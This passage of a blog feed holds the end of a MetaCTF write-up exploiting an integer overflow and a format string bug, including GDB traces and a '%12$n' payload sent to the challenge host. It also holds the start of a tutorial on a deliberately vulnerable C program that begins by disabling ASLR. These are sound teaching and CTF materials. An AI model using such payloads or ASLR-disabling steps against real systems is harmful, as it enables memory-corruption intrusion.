&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'0b11100011010111111010100100110001101000000000000000000000000000000000000000000000000000000000000000000000000000000'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;113&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'0000000000000000000000000000000000000000000000000000000000000000'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Technically, doing &lt;code class=&quot;highlighter-rouge&quot;&gt;total = 1000000000000000 * 9223372036854775808&lt;/code&gt; returns a value that is much greater than the price. However, when we look at the binary representation of this value, we can see that the value needs 113 bits of storage, and the first 64 bits are all zeros. When we use this value as the quantity, we end up only storing 64 bits of zeros in the program. Using this value lets us buy a shout out from god.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
shout-out-from-literally-god
How many would you like to buy? Must be greater than 0
9223372036854775808
Hmmmm
Nihaal
You have done well!
Good job!
Sincerely,
	~God
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we just need to exploit the format string vulnerability that we saw earlier. Using GDB, I set a breakpoint at the location where the format string vulnerability occurred, and I printed out the address of the value that I wanted to change.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 1, purchase () at text-game.cpp:164
164         printf(name.c_str());
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6
$rbx   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 (&quot;tool&quot;?)
$rcx   : 0x00007ffff7cc51e7  →  0x5177fffff0003d48 (&quot;H=&quot;?)
$rdx   : 0x0
$rsp   : 0x00007fffffffda70  →  0xff00ffffffffffff
$rbp   : 0x00007fffffffdd70  →  0x00007fffffffddd0  →  0x0000000000000000
$rsi   : 0x0000555555570eb0  →  &quot;Hmmmm\nny would you like to buy? Must be greater t[...]&quot;
$rdi   : 0x00007ffff7da24c0  →  0x0000000000000000
$rip   : 0x0000555555557569  →  &amp;lt;purchase()+1545&amp;gt; lea rdi, [rip+0x6d30]        # 0x55555555e2a0 &amp;lt;_Z4nameB5cxx11&amp;gt;
$r8    : 0x6
$r9    : 0x00007ffff7d9f240  →  0x0000000000000008
$r10   : 0x00007ffff7e1d499  →  &quot;_ZNKSt7num_getIcSt19istreambuf_iteratorIcSt11char_[...]&quot;
$r11   : 0x246
$r12   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 (&quot;tool&quot;?)
$r13   : 0x3
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda70│+0x0000: 0xff00ffffffffffff   ← $rsp
0x00007fffffffda78│+0x0008: 0x8000000000000000
0x00007fffffffda80│+0x0010: 0xffffffffffffffff
0x00007fffffffda88│+0x0018: 0x00007fffffffdad0  →  0x0000000000000000
0x00007fffffffda90│+0x0020: 0x00038d7ea4c68000
0x00007fffffffda98│+0x0028: 0x0000000000000000
0x00007fffffffdaa0│+0x0030: 0x00007fffffffda76  →  0x000000000000ff00
0x00007fffffffdaa8│+0x0038: 0x0000555555571750  →  0x0000555555571760  →  0x000000006c6f6f74 (&quot;tool&quot;?)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555557556 &amp;lt;purchase()+1526&amp;gt; mov    QWORD PTR [rbp-0x2d0], rax
   0x55555555755d &amp;lt;purchase()+1533&amp;gt; lea    rdi, [rip+0x2f6a]        # 0x55555555a4ce
   0x555555557564 &amp;lt;purchase()+1540&amp;gt; call   0x555555556620 &amp;lt;puts@plt&amp;gt;
 → 0x555555557569 &amp;lt;purchase()+1545&amp;gt; lea    rdi, [rip+0x6d30]        # 0x55555555e2a0 &amp;lt;_Z4nameB5cxx11&amp;gt;
   0x555555557570 &amp;lt;purchase()+1552&amp;gt; call   0x555555556410 &amp;lt;_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv@plt&amp;gt;
   0x555555557575 &amp;lt;purchase()+1557&amp;gt; mov    rdi, rax
   0x555555557578 &amp;lt;purchase()+1560&amp;gt; mov    eax, 0x0
   0x55555555757d &amp;lt;purchase()+1565&amp;gt; call   0x555555556390 &amp;lt;printf@plt&amp;gt;
   0x555555557582 &amp;lt;purchase()+1570&amp;gt; lea    rdi, [rip+0x2f4b]        # 0x55555555a4d4
────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:text-game.cpp+164 ────
    159         tool_time = 50000;
    160     } else if(option == &quot;shout-out-from-literally-god&quot;){
    161         bool god_is_happy = rand() &amp;amp; 0xFFFFFF == 0;
    162         bool* god_is_really_happy = &amp;amp;god_is_happy;
    163         printf(&quot;Hmmmm\n&quot;);
 →  164         printf(name.c_str());
    165         printf(&quot;\nYou have done well!\n&quot;);
    166         printf(&quot;Good job!\n&quot;);
    167
    168         if(*god_is_really_happy){
    169             printf(&quot;I'm feeling generous right now!\nHave a flag!\n&quot;);
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: &quot;text-game&quot;, stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555557569 → purchase()
[#1] 0x555555557a0d → main(argc=0x1, argv=0x7fffffffdec8)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  print god_is_really_happy
$1 = (bool *) 0x7fffffffda76
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The address was &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffda76&lt;/code&gt;, and since I had ASLR disabled on my machine, I just needed to search for the location of this address when I used a string formatter in my name. In the below example, you can see that the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffda76&lt;/code&gt; is the twelfth pointer being popped off of the stack.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting program: /home/n/Documents/Exploitation/metactf/Mining Hero/text-game
Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
Before we continue, what is your name?
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
shout-out-from-literally-god
How many would you like to buy? Must be greater than 0
9223372036854775808
Hmmmm
0x555555570eb0.(nil).0x7ffff7cc51e7.0x6.0x7ffff7d9f240.0x250070252e70252e.0x8000000000000000.0x2e70252e70252e70.0x7fffffffdad0.0x38d7ea4c68000.(nil).0x7fffffffda76.0x555555571720.0x555555571ef0.(nil).0x7fffffffdad8.(nil).(nil).(nil).0x555555571ef0.0x555555571ea0.0x555555571700.0x3.0x5555555716d0.0x1c.0x1e.0x2d6d6f72662d74.(nil).(nil).(nil).(nil).0x7fffffffdb50.0x4.0x6c6f6f74.(nil).0x64.0x7fffffffdb78.0xd.0x676172756f636e65.0x746e656d65.0x14.0x5555555716d0.0x1c.0x1c.(nil).0x38d7ea4c68000.(nil).0x2.0x800000000000000e.(nil).0x7ffff7c467b2.(nil).0x7ffff7e6d198.(nil).0x7ffff7da06a0.0x7ffff7fa0700.0x3.0x7ffff7f951a8.0x7ffff7f93ec0.0xff00000006.0x7ffff7c3a541.0x7ffff7d9f980.0x7ffff7d9f980.0x7ffff7da08a0.0x5d4990340e914700.(nil).0x7ffff7fa0700.(nil).0x7ffff7f951a8.0x7ffff7f93ec0.(nil).0x55555555e160.0x7ffff7e69f38.0x7ffff7fa0700.0x7fffffffdca0.0x7ffff7fa0700.0x6.0x6.0x5d4990340e914700.0x7fffffffdd2f.0x7fffffffdd30.0x7fffffffdd30.0x7ffff7f9ed00.0x33.0x33.0x7ffff7f9ed00.0x7ffff7e85176.0xa.0x3fffffffffffffff.0x7ffff7fa0700.0x1.0xf7f6f5f4f3f2f101.0x7ffff7f061ee.0x7ffff7fa0ce0.0x555555559eb0.0x7fffffffdd70.0x5d4990340e914700.0x7fffffffdec0.0x555555559eb0.0x5555555566b0.0x7fffffffdec0.0x7fffffffddd0.0x555555557a0d.0x7fffffffdec8.0x155557b43.0x7fffffffdda0.0x1.0x7ffff7da0033.0x555555559eb0.(nil).0x5d4990340e914700.0x555555559eb0.0x5555555566b0.(nil).0x7ffff7bdb0b3.0x7ffff7d9fb80.0x7fffffffdec8.0x100011c00.0x5555555577de.0x555555559eb0.0x4bf57339303d8b0.0x5555555566b0.0x7fffffffdec0.(nil).(nil).0xfb40a8cc28c3d8b0.0xfb40b848f3cdd8b0.(nil).(nil).(nil).0x1.0x7fffffffdec8.0x7fffffffded8.0x7ffff7ffe190.(nil).(nil).0x5555555566b0.0x7fffffffdec0.(nil).(nil).0x5555555566de.0x7fffffffdeb8.0x1c.0x1.0x7fffffffe243.(nil).0x7fffffffe280.0x7fffffffe290.0x7fffffffe2d8.0x7fffffffe2eb.0x7fffffffe2ff.0x7fffffffe32c.0x7fffffffe343.0x7fffffffe36f.0x7fffffffe381.0x7fffffffe3b7.0x7fffffffe3ce.0x7fffffffe3ee.0x7fffffffe402.0x7fffffffe42b.0x7fffffffe43f.0x7fffffffe456.0x7fffffffe46e.0x7fffffffe481.0x7fffffffe49d.0x7fffffffe4d4.0x7fffffffe4ef.0x7fffffff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This meant that if used the &lt;code class=&quot;highlighter-rouge&quot;&gt;%12$n&lt;/code&gt; format string in my name, I would write to the twelfth address on the stack. Since the twelfth address on the stack is the &lt;code class=&quot;highlighter-rouge&quot;&gt;god_is_really_happy&lt;/code&gt; pointer, we will be able to change the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;god_is_happy&lt;/code&gt; to true and get the flag!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc host1.metaproblems.com 5950
Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
Before we continue, what is your name?
1%12$n
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
9223372036854775808
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
shout-out-from-literally-god
How many would you like to buy? Must be greater than 0
9223372036854775808
Hmmmm
1
You have done well!
Good job!
I'm feeling generous right now!
Have a flag!
MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}
Sincerely,
    ~God
Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
          Simple Heap Buffer Overflow
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Mining Hero (click here for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.</summary></entry><entry><title type="html">Simple Heap Buffer Overflow</title><link href="http://localhost:4000/2020/10/21/simple-heap-buffer-overflow.html" rel="alternate" type="text/html" title="Simple Heap Buffer Overflow" /><published>2020-10-21T00:00:00-04:00</published><updated>2020-10-21T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/21/simple-heap-buffer-overflow</id><content type="html" xml:base="http://localhost:4000/2020/10/21/simple-heap-buffer-overflow.html">&lt;p&gt;Earlier today, I was messing around with some code, and I came up with &lt;a href=&quot;../../../assets/other/2020-10-21-heap-buffer-overflow/people.c&quot;&gt;this vulnerable program&lt;/a&gt;. This program was written using bad programming habits on purpose, and I am going to show you how it is vulnerable to a buffer overflow. This isn’t a complicated vulnerability, and while it does involve corrupting memory on the heap, it does not require you to have in-depth knowledge about how the heap works (unlike many other heap exploits).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;0 | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First of all, I am going to disable ASLR on my computer using the above command. This will make explaining the vulnerability a little bit easier, but later, I will show you a Python script that works even if ASLR is enabled.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./people
win() is at 0x55555555529f.

Valid commands:
new: Give birth to a new person.
greet: Say hello to a person.
kill: Kill a person.
quit: Stop the program.

&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When you first run the program, you’ll see that it leaks the location of a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;. Our goal is to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;, which prints out the flag.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag{insert_flag_here}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The program allows the user to type in various commands, so let’s see what happens when we issue the “new” command while running the program.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; new
Enter the person's name: Nihaal
Nihaal was born at 0x555555559ac0.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The new command allows the user to create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; on the heap, and it will print out the heap address where it was created. In this case, the program stored information about our &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; at address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555559ac0&lt;/code&gt;. Looking at the code, we can see that this is implemented using a structure called &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_Person&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_Person&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Something that is interesting is that this structure also contains a function pointer called &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt;. If we look a little bit further down in the code, we can see that there are two more functions, each of which contain some kind of greeting.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s says hello.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;yo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s says yo.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s go back to the running program again and use the &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command to see what happens.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; greet
Type in the address of the person you want to say hi to: 0x555555559ac0
You say hello to Nihaal.
Nihaal says yo.
&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interesting. What happens if we create another user and do the same thing?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; new
Enter the person's name: Sam
Sam was born at 0x555555559af0.
&amp;gt; greet
Type in the address of the person you want to say hi to: 0x555555559af0
You say hello to Sam.
Sam says hello.
&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice how in the first instance, we were greated with “yo,” but in the second instance, we were greated with “hello.” What is happening here is that in the first &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; instance, we had set the function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;yo&lt;/code&gt;, and it had executed the &lt;code class=&quot;highlighter-rouge&quot;&gt;yo()&lt;/code&gt; function. In the second &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; instance, we had set the function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt;, and it executed the &lt;code class=&quot;highlighter-rouge&quot;&gt;hello()&lt;/code&gt; function instead.&lt;/p&gt;

&lt;p&gt;This is essentially how object-oriented programming and polymorphism can be emulated in C. While C is obviously not an object-oriented language, you can still incorporate object-oriented behavior in C code by maintaining pointers to functions in structures. When you want to change the behavior of an object, all you have to do is change the function pointer in its structure for that instance of the object.&lt;/p&gt;

&lt;p&gt;Let’s take a look at the code responsible for dealing with the &lt;code class=&quot;highlighter-rouge&quot;&gt;new&lt;/code&gt; command, which is located in &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt;. I’ve added some comments to the code to explain what’s going on.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;new&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Buf contains the user input, and it can have a maximum of BUF_SIZE characters.&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// p is a Person* variable&lt;/span&gt;
